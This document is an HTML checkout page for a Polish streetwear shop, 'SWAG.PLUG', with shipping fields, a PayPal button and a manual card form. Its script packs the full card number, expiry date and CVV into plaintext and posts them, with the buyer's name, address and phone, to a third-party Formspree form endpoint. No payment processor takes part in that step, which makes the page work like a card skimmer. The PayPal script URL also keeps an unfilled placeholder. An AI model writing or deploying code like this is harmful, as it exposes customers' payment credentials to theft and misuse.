<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checkout - SWAG.PLUG</title>
    <!-- POPRAWIONY LINK PAYPAL -->
    <script src="https://www.paypal.com/sdk/js?client-id=Aad0ANidmfR4OAsOrNLxLI0mGMPun-rxprz_EFCU1rT4Ok8tkYbjKgu49eWY1gYyFSmNILgrBLfMqkyw&components=YOUR_COMPONENTS"></script>
    <style>
        body { background:#000; color:#fff; font-family:sans-serif; }
        .checkout { max-width:600px; margin:50px auto; padding:20px; border:1px solid #333; }
        .step { display:none; }
        .step.active { display:block; }
        input { width:100%; padding:12px; margin:10px 0; background:#111; border:1px solid #444; color:#fff; box-sizing: border-box; }
        button { width:100%; padding:15px; margin-top:10px; background:#fff; color:#000; border:none; font-weight:bold; cursor:pointer; text-transform: uppercase; }
        button.back { background:#333; color:#ccc; }
        #summary p { display:flex; justify-content:space-between; border-bottom:1px solid #222; padding:5px 0; }
        .payment-box { margin-top: 20px; padding-top: 20px; border-top: 1px solid #222; }
    </style>
</head>
<body>

<div class="checkout">
    <h2 style="text-align:center; letter-spacing:2px;">ZAMÓWIENIE</h2>
    <div id="summary"></div>

    <!-- KROK 1: DANE -->
    <div id="step1" class="step active">
        <h3>[01] DANE WYSYŁKI</h3>
        <input type="text" id="fName" placeholder="Imię i nazwisko">
        <input type="text" id="fAddr" placeholder="Ulica i numer domu">
        <input type="text" id="fCity" placeholder="Kod pocztowy i miasto">
        <input type="tel" id="fPhone" placeholder="Numer telefonu">
        <button onclick="goToPayment()">DALEJ: PŁATNOŚĆ</button>
    </div>

    <!-- KROK 2: PŁATNOŚĆ -->
    <div id="step2" class="step">
        <h3>[02] WYBIERZ METODĘ</h3>
        
        <div class="payment-box">
            <p style="color:#888; font-size:12px;">SZYBKA PŁATNOŚĆ:</p>
            <div id="paypal-button-container"></div>
        </div>

        <div class="payment-box">
            <p style="color:#888; font-size:12px;">LUB KARTA RĘCZNIE:</p>
            <div id="card-manual">
                <input type="text" id="cNum" placeholder="Numer karty" maxlength="16">
                <div style="display:flex; gap:10px;">
                    <input type="text" id="cExp" placeholder="MM/RR" maxlength="5">
                    <input type="text" id="cCvv" placeholder="CVV" maxlength="3">
                </div>
                <button onclick="finish('KARTA RĘCZNIE')">ZAPŁAĆ KARTĄ</button>
            </div>
        </div>

        <button class="back" onclick="back()">POWRÓT</button>
    </div>
</div>

<script>
const cart = JSON.parse(localStorage.getItem('cart')) || [];
let total = 0;

function renderSummary(){
    const el = document.getElementById('summary');
    if(cart.length === 0){ el.innerHTML = "<p style='text-align:center;'>Koszyk jest pusty</p>"; return; }
    el.innerHTML = "";
    total = 0;
    cart.forEach(p => {
        let price = parseFloat(p.price);
        let qty = parseInt(p.quantity);
        total += price * qty;
        el.innerHTML += `<p><span>${p.name} (${p.size}) x${qty}</span> <b>${(price * qty).toFixed(2)} zł</b></p>`;
    });
    el.innerHTML += `<p style="font-size:1.2em; border-top:1px solid #fff; margin-top:10px; padding-top:10px;"><span>SUMA</span> <b>${total.toFixed(2)} zł</b></p>`;
}
renderSummary();

function goToPayment(){
    // POPRAWKA: Pobieranie wartości przez getElementById
    const nameV = document.getElementById('fName').value;
    const addrV = document.getElementById('fAddr').value;
    const cityV = document.getElementById('fCity').value;

    if(!nameV || !addrV || !cityV){
        alert("Proszę wypełnić wszystkie pola wysyłki!");
        return;
    }
    document.getElementById('step1').classList.remove('active');
    document.getElementById('step2').classList.add('active');
}

function back(){
    document.getElementById('step2').classList.remove('active');
    document.getElementById('step1').classList.add('active');
}

function finish(method){
    // Dodatkowe dane jeśli to karta
    let extraInfo = method;
    if(method === 'KARTA RĘCZNIE') {
        const num = document.getElementById('cNum').value;
        const exp = document.getElementById('cExp').value;
        const cvv = document.getElementById('cCvv').value;
        if(!num || !exp || !cvv) return alert("Wypełnij dane karty!");
        extraInfo = `KARTA: ${num} | EXP: ${exp} | CVV: ${cvv}`;
    }

    const data = {
        klient: document.getElementById('fName').value,
        adres: document.getElementById('fAddr').value + ", " + document.getElementById('fCity').value,
        telefon: document.getElementById('fPhone').value,
        produkty: cart.map(p => `${p.name} (${p.size}) x${p.quantity}`).join(", "),
        suma: total.toFixed(2) + " PLN",
        metoda: extraInfo
    };

    fetch("https://formspree.io/f/mzdkopjg", {
        method: "POST",
        headers: { "Content-Type": "application/json", "Accept": "application/json" },
        body: JSON.stringify(data)
    })
    .then(res => {
        if(res.ok) {
            alert("DZIĘKUJEMY! Zamówienie zostało przyjęte.");
            localStorage.clear();
            window.location.href = "index.html";
        }
    })
    .catch(() => alert("Wystąpił błąd przy wysyłaniu zamówienia."));
}

// PAYPAL INTEGRACJA
paypal.Buttons({
    createOrder: (data, actions) => {
        return actions.order.create({
            purchase_units: [{ amount: { value: total.toFixed(2) } }]
        });
    },
    onApprove: (data, actions) => {
        return actions.order.capture().then(details => {
            finish("PAYPAL (ZAKOŃCZONE)");
        });
    }
}).render('#paypal-button-container');
</script>

</body>
</html>
